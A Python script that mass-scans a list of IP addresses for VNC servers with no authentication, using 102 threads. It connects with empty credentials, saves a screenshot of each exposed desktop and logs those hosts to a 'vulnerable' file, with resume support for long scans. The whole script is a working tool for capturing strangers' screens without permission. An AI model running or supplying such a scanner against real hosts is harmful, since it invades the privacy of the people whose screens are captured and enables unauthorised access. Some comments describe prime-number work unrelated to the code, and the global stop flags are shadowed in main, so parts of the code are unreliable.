import os
import time
from vncapi import api
import os.path
import threading
import shutil
from filelock import FileLock
stopThreads = False
unsaved = True
logInsecureIPs = False

def attemptConnect(ips):
    global stopThreads
    global unsaved
    global logInsecureIPs
    for ip in ips:
        if not stopThreads and unsaved:
            try:
                client = api.connect('{}:0'.format(ip),timeout=10, username='', password='')
                client.captureScreen('screenshot_IP_{}.png'.format(ip))
                print('Got image from {}'.format(ip))
                with FileLock("vulnerableIPs.txt.lock"): 
                        with open('vulnerableIPs.txt', "a") as file: 
                            file.write(ip + "\n")
                            file.close()
            except:
                print('Cant get image from {}'.format(ip))
                if logInsecureIPs:
                    with FileLock("nonVulnerableIPs.txt.lock"):
                            with open('nonVulnerableIPs.txt', "a") as file:
                                file.write(ip + "\n")
                                file.close()
        ips.remove(ip) #it should ALWAYS remove index[0]

def createSearchingFile(ipFile, searchingFile):
    print("We will now create a text file that is a copy of your current IPs. Creating text file of IPs to search...")
    shutil.copyfile(ipFile,searchingFile)
    print("Text file of IPs created. Beginning linear search...")

def createThread(maxThreads, ips):
    #Takes a number of threads and an array with all the numbers to be distributed equally amongst the threads
    #Allocates all numbers from 0 to maxNumber equally amongst all the threads in an array.
    #The array will consist of maxThreads numbers of array that contains all the numbers that each individual thread needs to solve.
    #Basically, each array in the array is a thread and the numbers it must find for the prime number
    
    threadList = []
    numbersPerThread = len(ips) // maxThreads #calculate the number of numbers each thread will have to check
    for i in range(maxThreads):
        start = i * numbersPerThread #calculate the starting index for this thread
        end = start + numbersPerThread #calculate the ending index for this thread
        print("start: {}".format(start))
        print("end: {}".format(end))

        if i == maxThreads - 1: #the last thread will have to check any remaining numbers
            end = len(ips)
            threadList.append(ips[start:end]) #add the array of numbers for this thread to the threadList

        else:
            threadList.append(ips[start:end])
    
    return threadList

def parseIPs(textFile):
    if os.path.isfile(textFile):
        print('List of ips detected.')
        with open(textFile) as f:
            lines = f.readlines()
            ips = []
            for line in lines:
                parsedLine = line.split(" ")
                try:
                    ips.append(parsedLine[3])
                except:
                    print("The following line does not work. Skipping line:")
                    print(line)
                    print("")
            f.close()
        print("Done. Proceeding with screenshotting: \n")
        return ips
    print("No list of ips detected.")

def parseIPsContinuous(textFile):
    if os.path.isfile(textFile):
        print('List of ips detected.')
        with open(textFile) as f:
            lines = f.readlines()
            ips = []
            for i in range(0,len(lines)):
                if i != 0:
                    ips.append(lines[i].strip()) #remove \n
            f.close()
        print("Done. Proceeding with screenshotting: \n")
        return ips
    print("No list of ips detected.")


def main():
    
    maxThreads = 102 #Please ensure that the amount of ips outnumber the amount of threads significantly
    threadRestartTime = 120 #set to super high for no restart
    ipFile = 'ips.txt'
    searchingFile = 'ipsLeft.txt' #the file to work with
    logInsecureIPs = False

    #if there is no searchingFile, create one with all the current ips
    if not os.path.isfile(searchingFile):
        createSearchingFile(ipFile, searchingFile)

    with open(searchingFile) as f:
        lines = f.readlines()
        if lines[0] == 'Parsed\n':
            ips_to_multithread = createThread(maxThreads, parseIPsContinuous(searchingFile))
        else:
            ips_to_multithread = createThread(maxThreads, parseIPs(ipFile))

    #Due to an issue in the underlying API, all threads must be restarted.
    #This will resolve issues involving Twisted timeout and such, as this API is not meant to be multithreaded
    #Every time Twisted has an error due to connec/tivity, it will crash the thread. Thus, we must recreate all threads

    unsaved = True
    while unsaved:
        stopThreads = False
        try:
            for i in range(0, maxThreads):

                thread = threading.Thread(target=attemptConnect, kwargs={'ips':ips_to_multithread[i]})
                thread.start()
            
            time.sleep(threadRestartTime)
            stopThreads = True
            print("Restarting all threads...")
            time.sleep(2)

        except:
            unsaved = False
            #We want to clear the current searchingFile and replace it with all the IPs currently in memory
            
            #Firstly, we clear the file
            with open(searchingFile,'w') as file:
                file.write("Parsed\n")
                file.close()

            #Now, we save this threads ips to the file
            print("\nProceeding to write all leftover IPs to: " + searchingFile)
            for i in range(0, maxThreads):
                ips = ips_to_multithread[i]
                with open(searchingFile, "a") as file: 
                    file.write('\n'.join(ips))
                    file.write('\n')
                    file.close()
            print("Progress saving complete. You may exit the script.")

if __name__ == '__main__':
    #if os.geteuid() != 0:
        #exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
    main()
